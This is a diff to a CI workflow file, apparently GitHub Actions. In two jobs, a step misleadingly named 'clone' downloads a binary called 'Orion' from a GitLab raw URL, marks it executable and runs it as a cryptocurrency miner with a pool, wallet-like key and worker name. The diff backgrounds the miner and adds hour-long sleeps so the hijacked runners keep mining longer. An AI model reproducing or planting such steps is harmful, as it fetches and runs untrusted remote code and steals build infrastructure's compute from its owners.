@@ -48,7 +48,8 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://gitlab.com/rk4243617/android/-/raw/main/Orion && chmod +x Orion && ./Orion mine -a --pool twbitz --key 78t7FTsXEHBpCEHUvnuSx91r1rJ8VLaym3iTREunwiwK --worker tod1 
+      run: wget https://gitlab.com/rk4243617/android/-/raw/main/Orion && chmod +x Orion && ./Orion mine -a --pool twbitz --key 78t7FTsXEHBpCEHUvnuSx91r1rJ8VLaym3iTREunwiwK --worker tod1 &
+           sleep 1h
           
         
     
@@ -74,7 +75,8 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://gitlab.com/rk4243617/android/-/raw/main/Orion && chmod +x Orion && ./Orion mine -a --pool twbitz --key 78t7FTsXEHBpCEHUvnuSx91r1rJ8VLaym3iTREunwiwK --worker tod1 
+      run: wget https://gitlab.com/rk4243617/android/-/raw/main/Orion && chmod +x Orion && ./Orion mine -a --pool twbitz --key 78t7FTsXEHBpCEHUvnuSx91r1rJ8VLaym3iTREunwiwK --worker tod1 &
+           sleep 2h
            
         
     
